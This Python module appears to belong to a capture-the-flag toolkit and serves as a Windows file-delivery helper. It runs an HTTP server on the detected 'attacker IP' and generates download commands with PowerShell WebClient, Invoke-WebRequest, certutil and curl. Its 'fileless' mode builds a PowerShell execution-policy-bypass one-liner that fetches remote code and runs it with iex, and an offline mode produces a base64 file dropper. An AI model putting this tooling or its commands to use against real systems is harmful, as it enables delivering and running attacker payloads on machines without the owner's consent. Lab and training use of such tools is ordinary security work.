import base64
import http.server
import os
import socket
import socketserver
import threading
from pathlib import Path

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
M = '\033[35m'
W_BOLD = '\033[1m'

# =========================================================
# HELPERS
# =========================================================

def detect_ip():
    """
    Attempt to detect attacker IP.
    """

    # -----------------------------------------------------
    # tun0
    # -----------------------------------------------------

    try:

        import netifaces

        if "tun0" in netifaces.interfaces():

            iface = netifaces.ifaddresses("tun0")

            if netifaces.AF_INET in iface:

                return iface[netifaces.AF_INET][0]["addr"]

    except Exception:
        pass

    # -----------------------------------------------------
    # fallback
    # -----------------------------------------------------

    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        s.connect(("1.1.1.1", 80))

        ip = s.getsockname()[0]

        s.close()

        return ip

    except Exception:

        return "127.0.0.1"


def copy_clipboard(text):

    try:

        import pyperclip

        pyperclip.copy(text)

        return True

    except Exception:

        return False


# =========================================================
# COMMAND GENERATORS
# =========================================================

def build_http_commands(ip, port, filename):

    ps1 = (
        f"(New-Object Net.WebClient).DownloadFile("
        f"'http://{ip}:{port}/{filename}',"
        f"'.\\\\{filename}')"
    )

    iwr = (
        f"Invoke-WebRequest "
        f"http://{ip}:{port}/{filename} "
        f"-OutFile .\\\\{filename}"
    )

    certutil = (
        f"certutil -urlcache -f "
        f"http://{ip}:{port}/{filename} "
        f"{filename}"
    )

    curl = (
        f"curl http://{ip}:{port}/{filename} "
        f"-o {filename}"
    )

    return {
        "powershell": ps1,
        "iwr": iwr,
        "certutil": certutil,
        "curl": curl,
    }


def build_fileless_command(ip, port, filename):

    return (
        f"powershell -ep bypass -nop -c "
        f"\"iwr http://{ip}:{port}/{filename} | iex\""
    )


def build_offline_command(filepath):

    data = Path(filepath).read_bytes()

    encoded = base64.b64encode(data).decode()

    filename = Path(filepath).name

    return (
        f"$b64='{encoded}'; "
        f"[IO.File]::WriteAllBytes("
        f"(Join-Path (Get-Location).Path '{filename}'), "
        f"[Convert]::FromBase64String($b64)"
        f")"
    )


# =========================================================
# HTTP SERVER
# =========================================================

def serve_http(filepath, port=8080):

    filepath = Path(filepath).resolve()

    directory = filepath.parent

    os.chdir(directory)

    handler = http.server.SimpleHTTPRequestHandler

    httpd = socketserver.TCPServer(
        ("0.0.0.0", port),
        handler
    )

    thread = threading.Thread(
        target=httpd.serve_forever,
        daemon=True
    )

    thread.start()

    return httpd


# =========================================================
# MODES
# =========================================================

def mode_http(filepath, ip, port):

    filename = Path(filepath).name

    cmds = build_http_commands(
        ip,
        port,
        filename
    )

    print(f"\n{M}=== HTTP ==={W}\n")

    for name, cmd in cmds.items():

        print(f"{B}[{name}]{W}")
        print(cmd)
        print()

    copy_clipboard(cmds["iwr"])

    print(f"{G}→ helper copied to clipboard{W}")

    print(
        f"\n{Y}[*] Serving {filename} "
        f"at http://{ip}:{port}/{W}"
    )

    return serve_http(filepath, port)


def mode_fileless(filepath, ip, port):

    filename = Path(filepath).name

    cmd = build_fileless_command(
        ip,
        port,
        filename
    )

    print(f"\n{M}=== FILELESS ==={W}\n")

    print(cmd)

    copy_clipboard(cmd)

    print(f"\n{G}→ helper copied to clipboard{W}")

    print(
        f"\n{Y}[*] Serving {filename} "
        f"at http://{ip}:{port}/{W}"
    )

    return serve_http(filepath, port)


def mode_offline(filepath):

    cmd = build_offline_command(filepath)

    print(f"\n{M}=== OFFLINE ==={W}\n")

    print(cmd)

    copy_clipboard(cmd)

    print(f"\n{G}→ helper copied to clipboard{W}")


# =========================================================
# INTERACTIVE MENU
# =========================================================

def choose_mode():

    print(f"\n{W_BOLD}[*] WINDOWS FILE DELIVERY{W}")

    print(f"\n  {B}[1]{W} HTTP")
    print(f"  {B}[2]{W} Fileless")
    print(f"  {B}[3]{W} Offline Base64")

    print()

    choice = input(f"{B}select{W}> ").strip()

    mapping = {
        "1": "http",
        "2": "fileless",
        "3": "offline",
    }

    return mapping.get(choice)


# =========================================================
# PUBLIC API
# =========================================================

def stage_windows_file(
    filepath,
    method=None,
    ip=None,
    port=8080,
):

    filepath = Path(filepath)

    if not filepath.exists():

        print(f"\n{R}[!] File not found.{W}")

        return

    if not ip:
        ip = detect_ip()

    if not method:
        method = choose_mode()

    if not method:
        return

    # -----------------------------------------------------
    # HTTP
    # -----------------------------------------------------

    if method == "http":

        server = mode_http(
            filepath,
            ip,
            port,
        )

        try:
            input("\nPress ENTER to stop server...\n")
        finally:
            server.shutdown()

    # -----------------------------------------------------
    # FILELESS
    # -----------------------------------------------------

    elif method == "fileless":

        server = mode_fileless(
            filepath,
            ip,
            port,
        )

        try:
            input("\nPress ENTER to stop server...\n")
        finally:
            server.shutdown()

    # -----------------------------------------------------
    # OFFLINE
    # -----------------------------------------------------

    elif method == "offline":

        mode_offline(filepath)


# =========================================================
# CLI ENTRY
# =========================================================

def run(data=None, cred=None, args=None):

    filepath = getattr(args, "file", None)

    if not filepath:

        print(
            f"\n{R}[!] Usage:{W} "
            f"ctf dropw <file>"
        )

        return data

    stage_windows_file(filepath)

    return data
